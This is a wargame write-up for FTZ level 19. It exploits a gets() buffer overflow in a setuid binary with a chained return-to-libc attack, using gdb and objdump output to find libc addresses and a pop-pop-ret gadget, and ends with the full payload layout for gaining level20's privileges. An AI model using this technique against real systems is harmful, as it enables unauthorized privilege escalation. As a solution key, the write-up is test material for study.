# Level19

## This level's goal
- Chaining return to lib

***

```
[level19@ftz level19]$ ls -l
-rwsr-x---    1 level20  level19     13615 Mar  8  2003 attackme
-rw-r-----    1 root     level19        65 Mar  8  2003 hint

[level19@ftz level19]$ cat hint

main()
{ char buf[20];
  gets(buf);
  printf("%s\n",buf);
}
```

```
[level19@ftz level19]$ gdb -q attackme
(gdb) disass main
0x08048443 <main+3>:    sub    esp,0x28
```

0x28 means 40bytes, so then 40bytes + SFO(4bytes) + RET(4bytes)

```
[level19@ftz level19]$ cp attackme tmp/
[level19@ftz level19]$ gdb -q tmp/attackme
(gdb) b *main
(gdb) run
Starting program: /home/level19/tmp/attackme

(gdb) p system
$1 = {<text variable, no debug info>} 0x4203f2c0 <system>

(gdb) p setreuid
$2 = {<text variable, no debug info>} 0x420d7920 <setreuid>
```

As above, I could get the system's and setreuid's address.

```
[level19@ftz tmp]$ cat getsh.c
#include <stdio.h>
int main()
{
        long shell = 0x4203f2c0;
        while ( memcmp((void*) shell, "/bin/sh", 8) )
        {
                shell++;
        }
        printf("0x%x\n", shell);
        return 0;
}
[level19@ftz tmp]$ gcc getsh.c -o getsh
[level19@ftz tmp]$ ./getsh
0x42127ea4
```

Now, I got /bin/sh's adress in system() function.

And then I need to get setreuid's argvs.

```
[level19@ftz tmp]$ cat /etc/passwd | grep level20
level20:x:3100:3100::/home/level20:/bin/bash
```

Level20's uid is 3100 means 0x0000C1C(HEX).

```
[level19@ftz tmp]$ objdump -d attackme | egrep 'pop|ret'
 80482d3:       c3                      ret
 8048342:       5e                      pop    %esi
 804836e:       5b                      pop    %ebx
 8048385:       c3                      ret
 80483eb:       5d                      pop    %ebp
 80483ec:       c3                      ret
 80483f8:       5d                      pop    %ebp
 80483f9:       c3                      ret
 8048426:       5d                      pop    %ebp
 8048427:       c3                      ret
 8048438:       5d                      pop    %ebp
 8048439:       c3                      ret
 804846a:       c3                      ret
 804849c:       58                      pop    %eax
 804849d:       5b                      pop    %ebx
 804849e:       5d                      pop    %ebp
 804849f:       c3                      ret
 80484a8:       5d                      pop    %ebp
 80484a9:       c3                      ret
 80484ba:       5b                      pop    %ebx
 80484cd:       c3                      ret
```

For the chaining method, PPR's address(pop-pop-ret) is 804849d.

As a result, the attack code will be 44 bytes dummy stirngs + setreuid address + PPR address + ruid + euid + system address + dummy(4bytes) + /bin/sh address.
setreuid address = 0x420d7920   
PPR address = 0x804849d   
ruid and euid = 0x0000C1C
system address = 0x4203f2c0
/bin/sh address = 0x42127ea4

```

```
